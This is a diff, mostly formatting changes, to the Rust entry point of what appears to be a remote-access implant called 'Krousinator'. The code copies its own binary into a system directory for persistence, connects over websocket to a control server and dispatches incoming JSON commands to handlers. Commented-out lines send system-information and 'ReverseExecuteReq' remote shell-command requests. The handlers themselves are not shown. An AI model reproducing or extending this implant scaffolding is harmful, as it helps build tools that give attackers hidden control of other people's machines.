@@ -1,24 +1,17 @@
 mod models;
-use common::registry::{
-    HandlerRegistry,
-    HandlerMeta,
-    Context
-};
+use common::registry::{Context, HandlerMeta, HandlerRegistry};
 // serd
 use serde_json::Value;
 
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 // ws
-use tokio_tungstenite::connect_async;
 use futures_util::StreamExt;
+use tokio_tungstenite::connect_async;
 
 // fs
-use tokio::fs::File;
 use std::path::Path;
 use tokio::fs::create_dir_all;
-// tokio utility
-// use tokio::sync::mpsc;
-
+use tokio::fs::File;
 
 #[cfg(target_os = "windows")]
 static DEST_PATH: &str = "C:\\ProgramData\\MyApp";
@@ -29,11 +22,7 @@ static DEST_PATH: &str = "/usr/local/bin/Krousinator";
 #[cfg(target_os = "linux")]
 static DEST_PATH: &str = "/usr/local/bin/Krousinator";
 
-
-
-
 async fn move_binary() -> Result<(), Box<dyn std::error::Error>> {
-    
     let binary = std::env::current_exe()?;
     let mut src = File::open(binary).await?;
 
@@ -43,7 +32,6 @@ async fn move_binary() -> Result<(), Box<dyn std::error::Error>> {
         create_dir_all(parent_dir).await?;
     }
 
-
     let mut dest = File::create(DEST_PATH).await?;
 
     let mut buffer = Vec::new();
@@ -51,16 +39,11 @@ async fn move_binary() -> Result<(), Box<dyn std::error::Error>> {
     dest.write_all(&buffer).await?;
 
     Ok(())
-
 }
 
 #[tokio::main]
 async fn main() {
-
-
-
     // setup
-
 
     // move_binary().unwrap_or_else(|e| panic!("moving binary operation failed: {}", e)).await;
     let mut reg: HandlerRegistry = HandlerRegistry::new();
@@ -69,17 +52,16 @@ async fn main() {
     for handler in inventory::iter::<HandlerMeta> {
         reg.register(handler.name, handler.constructor);
     }
-    
 
     // Establish connection
 
-    let (ws_stream, _) = connect_async::<&'static str>("ws://0.0.0.0:3000".into()).await.expect("uh oh");
+    let (ws_stream, _) = connect_async::<&'static str>("ws://0.0.0.0:3000".into())
+        .await
+        .expect("uh oh");
 
     println!("✅ Connected!");
     let (write, mut read) = ws_stream.split();
-    
 
-    
     // for i in 0..10 {
     //     write.send("{\"_t\":\"SystemInfoReq\"}".into()).await.unwrap();
     //     write.send(format!("{{\"_t\":\"ReverseExecuteReq\",\"payload\":\"cat /etc/nixos/background/e.png\",\"payload_response\":true}}").into()).await.unwrap();
@@ -87,14 +69,11 @@ async fn main() {
 
     let mut context = Context::new(write);
 
-
     // main ingress loop
-
 
     tokio::spawn(async move {
         loop {
             match read.next().await {
-                
                 Some(Ok(msg)) => {
                     let raw_text = match msg.into_text() {
                         Ok(text) => text,
@@ -103,8 +82,7 @@ async fn main() {
                             continue;
                         }
                     };
-                    
-                    
+
                     let json: Value = match serde_json::from_str(&raw_text) {
                         Ok(val) => val,
                         Err(_) => {
@@ -122,19 +100,19 @@ async fn main() {
                             continue;
                         }
                     };
-        
+
                     match reg.get(message_type, &raw_text) {
                         Some(handler) => match handler {
                             Ok(handler) => handler.handle(&mut context).await,
-                            Err(_err) => continue
-                        }
+                            Err(_err) => continue,
+                        },
                         None => {
                             println!("No handler found for type '{}'. Skipping.", message_type);
                             continue;
                         }
                     }
                 }
-                
+
                 Some(Err(e)) => {
                     eprintln!("WebSocket error: {}", e);
                     continue;
@@ -144,7 +122,7 @@ async fn main() {
                     break;
                 }
             }
-        }        
+        }
     });
 
     loop {
